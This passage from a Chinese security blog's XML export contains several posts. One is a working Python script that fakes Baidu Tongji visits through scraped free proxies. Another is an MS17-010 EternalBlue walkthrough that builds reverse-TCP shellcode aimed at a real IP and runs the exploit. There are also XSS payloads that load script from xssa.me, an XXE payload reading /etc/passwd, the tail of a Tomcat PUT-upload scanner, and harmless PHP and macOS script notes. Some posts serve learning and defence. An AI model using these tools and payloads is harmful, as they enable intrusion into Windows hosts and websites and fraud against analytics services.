urlList.put(url.decode("ascii")) return urlListdef main(): headCharPic="\r .--.\n |o_o | ------------------ \n |:_/ | &lt; Author: Mr.Bingo &gt;\n // \ \ ------------------ \n (| | ) &lt; oddboy.cn &gt;\n /'\_ _/`\ ------------------\n \___)=(___/\n" print(headCharPic) # Creating a parser parser=argparse.ArgumentParser() groupUser = parser.add_mutually_exclusive_group(required=True) groupUser.add_argument('-u',dest="url",help="target url") groupUser.add_argument('-U',dest='urlFile',help="url list file") parser.add_argument('-t',dest="threads",default=1,type=int,help="threads") parser.add_argument('-o',dest="outFile",help="output results") args=parser.parse_args() if args.urlFile is not None: urlList=readUrls(args.urlFile) else: urlList=queue.Queue() urlList.put(args.url) if args.outFile is not None: filePath,fileName=os.path.split(fileFullPath) if (filePath!="") and (not os.path.exists(filePath)): os.mikedirs(filePath) # 若不存在这个目录则递归创建 Attacker_obj=Attacker(urlList,args.threads,args.outFile) Attacker_obj.run_thread()if __name__ == '__main__': main() print("\n@@@ Done @@@") 漏洞总结该漏洞利用的前提条件需要手动开启readOnly功能，以支持上传操作，默认配置的情况下是无法成功利用漏洞，从实际测试来看，漏洞危害性并没有那么高。但是如果用户一旦启用了readOnly功能，黑客可利用漏洞成功入侵。 根据业务评估配置conf/webxml文件的readOnly值为Ture或注释参数，禁用PUT方法并重启tomcat服务，临时规避安全风险；注意： 如果禁用PUT方法，对于依赖PUT方法的应用，可能导致业务失效。 参考链接 NTFS Streams | https://msdn.microsoft.com/en-us/library/dn393272.aspx http://tomcat.apache.org/security-7.html#Fixed_in_Apache_Tomcat_7.0.81 Tomcat信息泄漏和远程代码执行漏洞分析报告（CVE-2017-12615/CVE-2017-12616）]]></content>
      <tags>
        <tag>文件上传</tag>
        <tag>tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[百度统计JS脚本分析 & 流量伪造脚本]]></title>
    <url>%2F2017%2F%E7%99%BE%E5%BA%A6%E7%BB%9F%E8%AE%A1JS%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90-%E6%B5%81%E9%87%8F%E4%BC%AA%E9%80%A0%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[花了两天时间，终于把百度统计的js代码大概看了看，并写了个刷流量的Python脚本。 实现原理百度统计网站 https://tongji.baidu.com &lt;script&gt;var _hmt = _hmt || [];(function() &#123; var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?789fd650fa0xxxxxxxxxxxx9d890b87f"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s); &#125;)();&lt;/script&gt; 在需要统计的页面加入上面的代码，引入hm.js脚本。 在获取该hm.js代码的同时，百度统计会往你的浏览器写入一个名字为“HMACCOUNT”的cookie，每一个cookie即为一个客户标识。（同IP不同用户的情况很常见，所以访问量不可能以IP为准） hm.js脚本执行，获取一些浏览器/网页/访问来源等一系列信息，包括屏幕尺寸、颜色深度、flash版本、用户语言等。 参数分析从js代码中可以得知，所有的参数包括“cc cf ci ck cl cm cp cu cw ds ep et fl ja ln lo lt nv rnd si st su v cv lv api sn ct u tt”。 经过吐血分析，大致的作用如下，以及一些实际示例（由于直接张贴有些乱，所以就贴图了。） python脚本实现主要思路： 访问目标url,获取标题和页面中的百度统计id。 从西刺代理获取免费代理。 访问hm.js获取cookie。 提交两次略有差异的GET请求到hm.gif #! /usr/bin/env python3# -*- coding: utf-8 -*-import requestsfrom bs4 import BeautifulSoupimport argparseimport osimport sysimport reimport queueimport threadingimport timeimport loggingimport randomfrom requests.packages.urllib3.exceptions import InsecureRequestWarningrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)logging.basicConfig(level=logging.WARNING)class Proxyer(object): def __init__(self,proxyListFile=None): self.proxyListFile = proxyListFile self.proxyList = queue.Queue() # proxy队列 self.xici_url='http://www.xicidaili.com/nn/' self.xici_pageid=0 # http://www.xicidaili.com/nn/&#123;id&#125; def readFromFile(self): with open(self.proxyListFile, 'r') as f: for line in f.readlines(): self.proxyList.put(str.lower(line).strip("\n")) return def readFrom_xicidaili(self): self.xici_pageid = self.xici_pageid + 1 if self.xici_pageid&lt;500 else 1 # 只读取前500个页面中的代理。 page_url = self.xici_url + str(self.xici_pageid) print("Read Proxies From :: %s"%page_url) ipPool=[] headers=&#123; 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,en;q=0.6', &#125; # Make a GET request and read the response req = requests.get(page_url,headers=headers) html_str=req.text # the pattern(Regular expression) is depend on the response data from your url pattern = r'\s*&lt;tr[\s\S]*?&lt;td&gt;(((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?))&lt;/td&gt;\s*?&lt;td&gt;(\d*?)&lt;/td&gt;[\s\S]*?&lt;a[\s\S]*?&gt;(.*?)&lt;/a&gt;[\s\S]*?&lt;td&gt;(HTTP|HTTPS)&lt;/td&gt;' regex = re.compile(pattern) s = regex.findall(html_str) #s = [('221.204.103.145', '103.', '103', '145', '9797', '山西太原', 'HTTP'), ...] for host in s: hostdict = (host[0],host[4],host[5],host[-1]) ipPool.append(hostdict) for x in ipPool: self.proxyList.put(str.lower('%s://%s:%s'% (x[3], x[0],x[1]))) return def getAProxy(self): logging.info("tring get a proxy...") proxy = "" try: proxy = self.proxyList.get(timeout=1) except: if (self.proxyList.empty): if self.proxyListFile is None : self.readFrom_xicidaili() else: self.readFromFile() # 读取一次用完后，再次读取。 proxy = self.proxyList.get() return proxyclass Cheater(object): def __init__(self,proxy_obj,url,source,vistiThread,visitCount): self.proxyer=proxy_obj self.sourceUrl=source self.visitCount=visitCount self.vistiThread=vistiThread self.counter=0 # 已完成的访问数 self.threadLock = threading.Lock() # 用于计数器 self.pageUrl="" self.pageTitle="" self.bdTongJiID="" try: r = requests.get(url) self.pageUrl = r.url print("当前页面URL :: ",self.pageUrl) soup = BeautifulSoup(r.text, 'lxml') html_str=soup.prettify() self.pageTitle=soup.title.string print("当前页面标题 :: ", self.pageTitle) except: print("目标网页读取失败！！！") sys.exit() try: self.bdTongJiID=re.search(r'hm.src = "https?\:\/\/hm.baidu.com\/hm.js\?(\w&#123;32&#125;)";',html_str,re.I).group(1) # 正则表达式提取32位字符串id print("获得百度统计代码ID :: ",self.bdTongJiID) if len(self.bdTongJiID)!=32 : print("百度统计ID异常") sys.exit() except: print("目标网页未引用百度统计js代码") sys.exit() def run_Threads(self): thread_arr=[] # 线程列表list for i in range(self.vistiThread): t = threading.Thread(target=self.doCheat) thread_arr.append(t) for i in range(self.vistiThread): thread_arr[i].start() for i in range(self.vistiThread): thread_arr[i].join() print("Job Finish!!! %d "%self.counter) def doCheat(self): while self.counter&lt;self.visitCount: print(".",end="") proxy=self.proxyer.getAProxy() try: proxy=re.match(r'(https?\:\/\/(\d+\.)&#123;3&#125;\d+\:\d+)',proxy).group(1) # 正则表达式校验proxy except: print("proxy正则校验失败...") continue protocol=proxy.split("://")[0] headers=&#123; 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36', 'Accept': '*/*', 'Accept-Language': 'zh-CN,zh;q=0.8,en;q=0.6', 'Referer': self.pageUrl &#125; try: s="" s=requests.session() # 访问hm.js?&#123;ID&#125;获取cookie s.get("https://hm.baidu.com/hm.js?"+self.bdTongJiID,headers=headers,proxies=&#123;protocol:proxy&#125;,verify=False,timeout=15) # 直接访问1 | 站外跳入1 params=&#123; 'cc':'0', 'ck':'1', 'cl':'24-bit', 'ds':'1280x800', 'et':'0', 'fl':'26', 'ja':'0', 'ln':'zh-cn', 'lo':'0', 'lt':str(int(time.time())-2), 'nv':str( 0 if (self.sourceUrl is None) else 1), 'rnd':str(random.randint(0,2147483647)), 'si':str(self.bdTongJiID), 'st':str( 4 if (self.sourceUrl is None) else 1), #'su':str( self.sourceUrl if（self.sourceUrl is not None) else "" ), 'v':'1.2.16', 'lv':'3', 'sn':str(int(time.time())%65535), 'ct':'!!', 'tt':self.pageTitle &#125; if self.sourceUrl is not None: params['su']=self.sourceUrl # 第一次提交数据 r=s.get("http://hm.baidu.com/hm.gif",headers=headers,params=params,proxies=&#123;protocol:proxy&#125;,verify=False,timeout=5) logging.info(r.url) time.sleep(1) # 直接访问2 | 站外跳入2 params['et']='87' params['rnd']=str(random.randint(0,2147483647)) params.pop('sn') # 移除 sn params.pop('ct') # 移除 ct params.pop('tt') # 移除 tt ep=&#123; 'netAll':random.randint(5,500), 'netDns':0, 'netTcp':0, 'srv':random.randint(5,200), 'dom':random.randint(250,750), 'loadEvent':random.randint(800,1500), 'qid':"", 'bdDom':0, 'bdRun':0, 'bdDef':0 &#125; ep= '&#123;"netAll":'+ str(random.randint(5,500)) + ',"netDns":0' + ',"netTcp":0' + ',"srv":' + str(random.randint(5,200)) + ',"dom":' + str(random.randint(250,750))+',"loadEvent":' + str(random.randint(800,1500))+',"qid":"","bdDom":0,"bdRun":0,"bdDef":0&#125;' params['ep']=str(ep) # 顺序变乱，尚不清楚是否影响使用 # 第二次提交数据 r=s.get("http://hm.baidu.com/hm.gif",headers=headers,params=params,proxies=&#123;protocol:proxy&#125;,verify=False,timeout=5) logging.info(r.url) self.threadLock.acquire() self.counter = self.counter + 1 print("\rSuccess %d times"%self.counter) self.threadLock.release() except: #print("Failed! Do again...") print(".",end="") finally: pass time.sleep(1)def main(): headCharPic="\r .--.\n |o_o | ------------------ \n |:_/ | &lt; Author: Mr.Bingo &gt;\n // \ \ ------------------ \n (| | ) &lt; oddboy.cn &gt;\n /'\_ _/`\ ------------------\n \___)=(___/\n" print(headCharPic) # Creating a parser parser=argparse.ArgumentParser( #prog="BingoBF", usage="%(prog)s [options] ", description='刷百度统计访问数据', epilog="+---+\n" ) parser = argparse.ArgumentParser() parser.add_argument("-u",dest="url",action="store",required=True,help="目标URL，HM_ID从网页中提取") parser.add_argument("--proxyList",dest="proxyList",action="store",default=None,help="代理地址列表文件，格式： http://127.0.0.1:8080 ; 如空，则自动从xicidaili.com/nn上爬取。") parser.add_argument("-s",dest="source",action="store",default=None,help="流量来源地址") parser.add_argument("-c",dest="count",action="store",default=10, type=int , help="访问次数 (目前只实现单一网页,单次访问统计),默认10次") parser.add_argument("-t",dest="threads",action="store",default=1,type=int,help="线程数，默认为1") args=parser.parse_args() proxy_obj=Proxyer(args.proxyList) # 生成一个Proxyer对象 cheater_obj = Cheater(proxy_obj,args.url,args.source,args.threads,args.count) # 生成一个Cheater对象 cheater_obj.run_Threads()if __name__ == '__main__': main()]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS - 笔记整理]]></title>
    <url>%2F2017%2FXSS-%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[XSS(Cross Site Scripting) 用户输入超出开发者预期的数据，导致在网页中添加或修改页面代码，从而执行恶意操作。 XSS的分类 反射型XSS 持久型XSS DOM-based型XSS（客户端注入） XSS的危害 Cookie资料窃取 劫持用户会话 广告弹窗 网页挂马 网站钓鱼 按键记录 …(JS能完成的任何功能) XSS的构造 利用&lt;&gt;标记注入HTML/JavaScript标签&lt;script&gt;alert(1)&lt;/script&gt;&lt;sCRiPt sRC=http://xssa.me/EXgq&gt;&lt;/sCrIpT&gt; 利用HTML标签属性值执行XSS&lt;a href=&quot;javascript:alert(1)&quot;&gt;click me&lt;/a&gt;...除href/src外的其它类似属性 在HTML标签中注入事件&lt;img src=x onerror=&quot;javascript:alert(/XSS/)&quot;&gt;&lt;img src=logo.png onload=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://xssa.me/EXgq&apos;;&gt;&lt;input onfocus=a=&apos;scr&apos;;s=createElement(a+&apos;ipt&apos;);body.appendChild(s);s.src=&apos;http://xssa.me/EXgq&apos;; autofocus&gt;...各种on事件 利用CSS跨站 尝试多种样式表(css),均无效。原因未知 XSS的变形&lt;sCRiPt/SrC=//xssa.me/EXgq&gt;&lt;ScRiPt/**/src=http://xssa.me/EXgq&gt;&lt;/ScRiPt&gt;&lt;img src=1 onerror=$.get(&apos;http://xssa.me/EXgq&apos;)&gt; (jquery)eval($.get(&apos;http://xssa.me/EXgq&apos;)) (jquery)&lt;svg/onload=document.body.appendChild(document.createElement(/script/.source)).src=&apos;http://xssa.me/EXgq&apos; XSS的防御原则1：不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码 原则2：在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码 HTML Entity编码&amp; –&gt; &amp;amp;&lt; –&gt; &amp;lt;&gt; –&gt; &amp;gt;” –&gt; &amp;quot;‘ –&gt; &amp;#x27;/ –&gt; &amp;#x2f; 原则3：在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码 除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 &#xHH; （以&amp;#x开头，HH则是指该字符对应的十六进制数字，分号作为结束符） 之所以编码规则如此严格，是因为开发者有时会忘记给属性的值部分加上引号。如果属性值部分没有使用引号的话，攻击者很容易就能闭合掉当前属性，随后即可插入攻击脚本。例如，如果属性没有使用引号，又没有对数据进行严格编码，那么一个空格符就可以闭合掉当前属性。 除了空格符可以闭合当前属性外，这些符号也可以：% * + , – / ; &lt; = &gt; ^ | `(反单引号，IE会认为它是单引号) 原则4：在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码 除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \xHH （以 \x 开头，HH则是指该字符对应的十六进制数字 在对不可信数据做编码的时候，千万不能图方便使用反斜杠（ \ ）对特殊字符进行简单转义，比如将双引号 ” 转义成 \” ，这样做是不可靠的，因为浏览器在对页面做解析的时候，会先进行HTML解析，然后才是JavaScript解析，所以双引号很可能会被当做HTML字符进行HTML解析，这时双引号就可以突破代码的值部分，使得攻击者可以继续进行XSS攻击。 原则5：在将不可信数据插入到Style属性里时，对这些数据进行CSS编码 除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \HH （以 \ 开头，HH则是指该字符对应的十六进制数字） 原则6：在将不可信数据插入到HTML URL里时，对这些数据进行URL编码 除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 %HH （以 % 开头，HH则是指该字符对应的十六进制数字） 在对URL进行编码的时候，有两点是需要特别注意的： 1) URL属性应该使用引号将值部分包围起来，否则攻击者可以很容易突破当前属性区域，插入后续攻击代码 2) 不要对整个URL进行编码，因为不可信数据可能会被插入到href, src或者其他以URL为基础的属性里，这时需要对数据的起始部分的协议字段进行验证，否则攻击者可以改变URL的协议，例如从HTTP协议改为DATA伪协议，或者javascript伪协议。 原则7：使用富文本时，使用XSS规则引擎进行编码过滤 针对富文本的特殊性，我们可以使用XSS规则引擎对用户输入进行编码过滤，只允许用户输入安全的HTML标签，如 b, i, p等，对其他数据进行HTML编码。需要注意的是，经过规则引擎编码过滤后的内容只能放在div, p等安全的HTML标签里，不要放到HTML标签的属性值里，更不要放到HTML事件处理属性里，或者放到SCRIPT标签里。 XSS Cheat Sheethttps://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet 参考资料 《XSS跨站脚本 攻击剖析与防御》PDF 百度云 (PS:书写的很一般，没必要买实体书，虽说我买了。) 防御XSS的七条原则 XSS Filter Evasion Cheat Sheet]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ms17-010 python脚本exploit]]></title>
    <url>%2F2017%2Fms17-010-python%E8%84%9A%E6%9C%ACexploit%2F</url>
    <content type="text"><![CDATA[脚本github : https://github.com/worawit/MS17-010 生成shellCodenasm -f bin eternalblue_kshellcode_x86.asm -o eternalblue_kshellcode_x86.bin # 32位kernel codenasm -f bin eternalblue_kshellcode_x64.asm -o eternalblue_kshellcode_x64.bin # 64位kernel codemsfvenom -p windows/shell/reverse_tcp lhost=47.90.92.56 lport=5910 -f raw -o msf_shellcode_x86_ms17010_sunny5910.raw EXITFUNC=thread # 32位msf reverse_tcp codemsfvenom -p windows/x64/shell/reverse_tcp lhost=47.90.92.56 lport=5910 -f raw -o msf_shellcode_x64_ms17010_sunny5910.raw EXITFUNC=thread # 64位msf reverse_tcp codecat eternalblue_kshellcode_x64.bin msf_shellcode_x64_ms17010_sunny5910.raw &gt; shellcode_sunny5910_x64.bin # 64位代码整合cat eternalblue_kshellcode_x86.bin msf_shellcode_x86_ms17010_sunny5910.raw &gt; shellcode_sunny5910_x86.bin # 32位代码整合python eternalblue_sc_merge.py shellcode_sunny5910_x64.bin shellcode_sunny5910_x86.bin shellcode_sunny5910_all.bin # x86与x64代码整理（实际中有出现蓝屏，原因未知） 本地接收shellsunny clientid e6cc2bd36aXXXXXXX (个人id, 5910端口映射)msfconsole # 启动MSFuse exploit/multi/handlerset lhost 0.0.0.0set lport 5910run 攻击eternalblue_exploit7.py :: Eternalblue exploit for Windows 7/2008eternalblue_exploit8.py :: Eternalblue exploit for windows 8/2012 x64 python eternalblue_exploit7.py 10.1.1.4 shellcode_sunny5910_all.bin # 攻击导致蓝屏python eternalblue_exploit7.py 10.1.1.4 shellcode_sunny5910_x64.bin # 攻击成功]]></content>
      <tags>
        <tag>ms17-010</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[雷达巡航扫描系统--mac启动/终止脚本]]></title>
    <url>%2F2017%2F%E9%9B%B7%E8%BE%BE%E5%B7%A1%E8%88%AA%E6%89%AB%E6%8F%8F%E7%B3%BB%E7%BB%9F-mac%E5%90%AF%E5%8A%A8-%E7%BB%88%E6%AD%A2%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[主要涉及到使用osascript提权功能。 另外,打算使用 trap “bash kill.sh;exit” EXIT INT TERM QUIT KILL来自动结束脚本所启动的后台服务，然后将启动脚本写入automantor中。 但最后并没有使用，因为有些问题不太清楚，比如：在automator中结束时到底具体捕获哪一个信号？ 暂且这样使用，后续有需求，再处理。 trap捕获信号 http://man.linuxde.net/trapPS: bash下可用，zsh下疑似有问题。 启动脚本#!/bin/shcd /Users/jason/geekTools/radarif [ $? -eq 0 ]then /usr/local/bin/mongod --port 65521 --dbpath DBData --auth &gt;&gt; log/db.log 2&gt;&amp;1 &amp; /usr/local/bin/python Run.py &gt;&gt; log/web.log 2&gt;&amp;1 &amp; osascript -e 'do shell script "sudo -s /usr/local/bin/python aider/Aider.py &gt;&gt; log/aider.log 2&gt;&amp;1 &amp;" with administrator privileges' /usr/local/bin/python nascan/NAScan.py &gt;&gt; log/nascan.log 2&gt;&amp;1 &amp; /usr/local/bin/python vulscan/VulScan.py &gt;&gt; log/vulscan.log 2&gt;&amp;1 &amp; echo "Radar Started"; say "Radar Started"; #trap "bash kill.sh;exit" EXIT INT TERM QUIT KILL #bash kill.sh; # while true; do # sleep 86400; # donefi 终止脚本#!/bin/shps aux | grep 'mongod --port 65521 --dbpath DBData --auth' | grep -v 'grep'| awk -F ' ' '&#123;print $2&#125;' | xargs kill;ps aux | grep 'Run.py' | grep -v 'grep' | awk '&#123;print $2&#125;' | xargs kill;#osascript -e 'do shell script "ps aux | grep \"aider/Aider.py\" | grep -v \"grep\" | awk \"&#123;print $2&#125;\" | xargs sudo -s kill" with administrator privileges'killAider="ps aux | grep 'aider/Aider.py' | grep -v 'grep' | awk '&#123;print \$2&#125;' | xargs sudo -s kill";killAider='do shell script "'$killAider'" with administrator privileges';osascript -e "$killAider";#trap "osascript -e \"$killAider\"" EXIT INT TERM QUIT KILL;ps aux | grep 'nascan/NAScan.py' | grep -v 'grep' | awk '&#123;print $2&#125;' | xargs kill;ps aux | grep 'vulscan/VulScan.py' | grep -v 'grep' | awk '&#123;print $2&#125;' | xargs kill;echo "Radar Terminated";say "Radar Terminated";exit 问题记录需要kill -9 xxx 才能结束某些进程。➜ radar git:(master) ✗ ps aux | grep 'mongod --port 65521 --dbpath DBData --auth'jason 17784 0.0 0.0 2452848 2004 ?? S 10:39AM 0:00.02 /bin/bash -c #!/bin/sh\012cd /Users/jason/geekTools/radar\012if [ $? -eq 0 ]\012then\012 /usr/local/bin/mongod --port 65521 --dbpath DBData --auth &gt;&gt; log/db.log 2&gt;&amp;1 &amp;\012 /usr/local/bin/python Run.py &gt;&gt; log/web.log 2&gt;&amp;1 &amp;\012\011osascript -e 'do shell script "sudo -s /usr/local/bin/python aider/Aider.py &gt;&gt; log/aider.log 2&gt;&amp;1 &amp;" with administrator privileges'\012 /usr/local/bin/python nascan/NAScan.py &gt;&gt; log/nascan.log 2&gt;&amp;1 &amp;\012 /usr/local/bin/python vulscan/VulScan.py &gt;&gt; log/vulscan.log 2&gt;&amp;1 &amp;\012 echo "Radar Started";\012 say "Radar Started";\012 trap "bash kill.sh;exit" EXIT INT TERM QUIT KILL\012 while true; do \012 sleep 86400;\012 done\012fi\012 -jason 18686 0.0 0.0 2433828 1924 s001 R+ 10:47AM 0:00.00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn mongod --port 65521 --dbpath DBData --authjason 18370 0.0 0.0 2435440 2240 ?? S 10:44AM 0:00.01 /bin/bash -c #!/bin/sh\012cd /Users/jason/geekTools/radar\012if [ $? -eq 0 ]\012then\012 /usr/local/bin/mongod --port 65521 --dbpath DBData --auth &gt;&gt; log/db.log 2&gt;&amp;1 &amp;\012 /usr/local/bin/python Run.py &gt;&gt; log/web.log 2&gt;&amp;1 &amp;\012\011osascript -e 'do shell script "sudo -s /usr/local/bin/python aider/Aider.py &gt;&gt; log/aider.log 2&gt;&amp;1 &amp;" with administrator privileges'\012 /usr/local/bin/python nascan/NAScan.py &gt;&gt; log/nascan.log 2&gt;&amp;1 &amp;\012 /usr/local/bin/python vulscan/VulScan.py &gt;&gt; log/vulscan.log 2&gt;&amp;1 &amp;\012 echo "Radar Started";\012 say "Radar Started";\012 trap "bash kill.sh;exit" EXIT INT TERM QUIT KILL\012 while true; do \012 sleep 86400;\012 done\012fi\012 -]]></content>
  </entry>
  <entry>
    <title><![CDATA[PHP多版本安装与切换(Ubuntu-16-04-LTS)]]></title>
    <url>%2F2017%2FPHP%E5%A4%9A%E7%89%88%E6%9C%AC%E5%AE%89%E8%A3%85%E4%B8%8E%E5%88%87%E6%8D%A2(Ubuntu-16-04-LTS)%2F</url>
    <content type="text"><![CDATA[打算使用phpBrew来进行PHP版本管理，然而phpBrew的使用需要在Ubuntu 16上默认安装的PHP版本为5，却无法直接apt-get install php5，所以打算基于php7尝试使用。 结果很悲剧，疑似pkg-config出问题了。 所以本文主要做一个记录，祭奠浪费掉的两整天时间。最后憋屈的使用PHPstudy了。 /(ㄒoㄒ)/~~ PPA安装PHP- 安装PHP 5.6$ sudo apt-get install software-properties-common # 安装PPA工具$ sudo add-apt-repository ppa:ondrej/php # ondrej这个哥们维护在launchpad上的$ sudo apt-get update$ sudo apt-get install -y php5.6 - 安装PHP 7.1$ sudo apt-get install python-software-properties$ sudo add-apt-repository ppa:ondrej/php$ sudo apt-get update$ sudo apt-get install -y php7.1 PHP版本切换PHP 5.6 =&gt; PHP 7.1Apache:-$ sudo a2dismod php5.6$ sudo a2enmod php7.1CLI:-$ update-alternatives --set php /usr/bin/php7.1 PHP 7.1 =&gt; PHP 5.6Apache:-$ sudo a2dismod php7.1$ sudo a2enmod php5.6$ sudo service apache2 restartCLI:-$ sudo update-alternatives --set php /usr/bin/php5.6 使用phpBrew安装/切换PHP版本【失败】https://github.com/phpbrew/phpbrew $ sudo apt-get update$ sudo apt-get install php7.0 php7.0-cli php7.0-dev php7.0-curl php7.0-json php7.0-cgi php-pear autoconf automake curl build-essential openssl libssl-dev libcurl4-openssl-dev libxslt1-dev re2c libxml2 libxml2-dev bison libbz2-dev libreadline-dev libmhash2 libmhash-dev libmcrypt4 libmcrypt-dev# openssl成功安装的$ pkg-config --list-all | grep opensslopenssl OpenSSL - Secure Sockets Layer and cryptography libraries and tools$ phpbrew install 5.5.38 # 出错！！！！ checking for pkg-config... /usr/bin/pkg-config configure: error: Cannot find OpenSSL&apos;s libraries----------------------$ phpbrew install 5.5.38 -- --with-openssl=/usr/bin/openssl checking for pkg-config... /usr/bin/pkg-config configure: error: Cannot find OpenSSL&apos;s &lt;evp.h&gt;$ phpbrew install 5.5.38 -- --with-openssl=/usr/bin/openssl --with-openssl-dir=/usr/include/openssl/ checking for pkg-config... /usr/bin/pkg-config configure: error: Cannot find OpenSSL&apos;s &lt;evp.h&gt; 各种无言以对，花了两整天时间，无法解决！]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web API接口安全了解]]></title>
    <url>%2F2017%2FWeb-API%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8%E4%BA%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[2017版OWASP top 10 将API安全纳入其中，足以说明API被广泛使用且安全问题严重。自己尝试整理一下，但限于本人搬砖经验还不足、水平有限，本文只能算是抛砖引玉，希望大伙不吝赐教。 了解Web Service（API）Web Service是一种跨编程语言和跨操作系统平台的远程调用技术。目前被广泛运用于移动端APP、物联网IoT、WEB应用等场景。 主流Web Service实现方式SOAP/XML简单对象访问协议(SOAP)接口，通过HTTP进行消息传输。它是基于xml语言开发，使用Web服务描述语言(WSDL)来进行接口描述。是一种很成熟的Web Service实现方式，整体上有被REST取代的趋势。 REST/JSON表现层状态转移(REST),本质上讲的是一种ROA（Resource Oriented Architecture）架构风格。符合这种架构风格的API接口，我们称之为RESTful API。 PS: REST风格的接口既可以使用JSON，也可以使用XML，但由于JSON更加轻，故而基本不用XML。 XML示例:&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt; &lt;person&gt; &lt;name&gt;Jason&lt;/name&gt; &lt;age&gt;99&lt;/age&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;contact&gt; &lt;mobile&gt;13888888888&lt;/mobile&gt; &lt;email&gt;bingo@tass.com.cn&lt;/email&gt; &lt;wechat&gt;bingo&lt;/wechat&gt; &lt;/contact&gt; &lt;/person&gt; JSON示例:&#123; &quot;person&quot;: &#123; &quot;name&quot;: &quot;Jason&quot;, &quot;age&quot;: &quot;99&quot;, &quot;sex&quot;: &quot;male&quot;, &quot;contact&quot;: &#123; &quot;mobile&quot;: &quot;13888888888&quot;, &quot;email&quot;: &quot;bingo@tass.com.cn&quot;, &quot;wechat&quot;: &quot;bingo&quot; &#125; &#125;&#125; API安全API的安全要素 认证和鉴权 - 认证用户身份 &amp; 确定用户权限 通常情况下，webAPI是基于HTTP协议的，也是无状态传输的。故而认证任务就需要我们自己实现，所以原则上每一次API请求都需要带上身份认证信息，通常使用的是API key。 加密和签名 - 保证信息的保密性和完整性 通常使用SSL/TLS来加密通信消息，由API客户端发送和接收。签名用于确保API请求和响应在传输过程中未被篡改。 漏洞 - 注入攻击 &amp; 敏感数据泄露 &amp; 越权访问 攻击面检测 尽可能多的了解API端点、消息、参数、行为。 发现API中可能存在问题的元数据。 记录流量进一步学习API 爆破 - 暴力破解路径或资源 攻击方式1.模糊测试 使用自动化工具并行的将大量的随机内容（各种可能的值或可能的攻击向量）作为输入参数进行长时间的尝试，并自动验证响应信息，确认是否获取到意外收获（系统或代码相关的信息）。 2.注入攻击 使用SQL,XML,Xpath,JSON,JavaScript等的常见攻击向量尝试进行代码注入，并验证意外响应。 3.无效/越界内容 尝试各种无效或者超范围的内容，并验证响应信息。 4.恶意内容 在上传功能点尝试上传可执行文件或脚本等，使服务器尝试进行解析。 5.XSS 上传常见攻击向量进行XSS（反射型，存储型等）测试。 6.CSRF 测试API是否含有token，token是否能复用，是否可被伪造。 7.不安全的直接对象引用 尝试对顺序化的id号进行越权访问，尝试访问无权限的方法或操作。 8.其它考虑 会话认证（token是否正确使用） 安全配置（前述攻击照成系统/应用等信息泄露） 攻击演示1. DVWS | WSDL Enumeration前端页面 源码中暴露wsdl文件 wsdl文件中可以查看到四种方法 使用READY!API（SOAPUI升级版）可以直观的看到4种方法并进行接口测试 尝试使用check_user_information方法，尝试填入username（实际测试中可能需要结合爆破方式），接口返回了相关数据，从而导致数据泄露。 2. DVWS | XML External Entity Processing提交正常请求:&lt;name&gt;Mr.Bingo&lt;/name&gt; 提交payload:&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE bingo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt; 额外测试： 3. DVWS | Server Side Request Forgery正常数据请求 篡改请求URL 4. DVWS | REST API SQL Injection正常请求资源： SQL注入： 5. bWAPP | SQL Injection - Blind (WS/SOAP)由于在前端屏蔽了后端所采用的API接口功能，故而贴出部分源码以供参考&lt;?phpif(isset($_REQUEST[&quot;title&quot;]))&#123; // Includes the NuSOAP library require_once(&quot;soap/nusoap.php&quot;); // Creates an instance of the soap_client class $client = new nusoap_client(&quot;http://localhost/bWAPP/ws_soap.php&quot;); // Calls the SOAP function $tickets_stock = $client-&gt;call(&quot;get_tickets_stock&quot;, array(&quot;title&quot; =&gt; sqli($_REQUEST[&quot;title&quot;]))); echo &quot;We have &lt;b&gt;&quot; . $tickets_stock . &quot;&lt;/b&gt; movie tickets available in our 